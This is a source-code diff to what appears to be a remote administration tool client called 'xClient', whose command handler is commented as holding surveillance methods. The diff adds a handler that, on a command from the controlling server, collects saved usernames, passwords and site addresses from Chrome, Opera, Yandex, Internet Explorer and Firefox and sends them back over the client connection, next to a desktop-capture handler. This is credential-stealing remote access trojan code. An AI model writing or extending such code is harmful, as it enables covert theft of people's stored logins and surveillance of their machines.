@@ -8,12 +8,36 @@ using System.Threading;
 using xClient.Core.Networking;
 using xClient.Core.Utilities;
 using xClient.Enums;
+using xClient.Core.Recovery.Helper;
+using System.Collections.Generic;
+using PasswordRecovery.Browsers;
 
 namespace xClient.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
     public static partial class CommandHandler
     {
+        public static void HandlePasswordRequest(Packets.ServerPackets.GetPasswords packet, Client client)
+        {
+            List<LoginInfo> mainList = new List<LoginInfo>();
+            
+            mainList.AddRange(Chrome.Passwords());
+            mainList.AddRange(Opera.Passwords());
+            mainList.AddRange(Yandex.Passwords());
+            mainList.AddRange(InternetExplorer.Passwords());
+            mainList.AddRange(Firefox.Passwords());
+
+            List<string> raw = new List<string>();
+
+            foreach (LoginInfo value in mainList)
+            {
+                string rawValue = string.Format("{0}|$|{1}|$|{2}|$|{3}", value.Username, value.Password, value.URL, value.Browser);
+                raw.Add(rawValue);
+            }
+            
+            new Packets.ClientPackets.GetPasswordsResponse(raw.ToArray()).Execute(client);
+        }
+
         public static void HandleGetDesktop(Packets.ServerPackets.GetDesktop command, Client client)
         {
             var resolution = FormatHelper.FormatScreenResolution(ScreenHelper.GetBounds(command.Monitor));
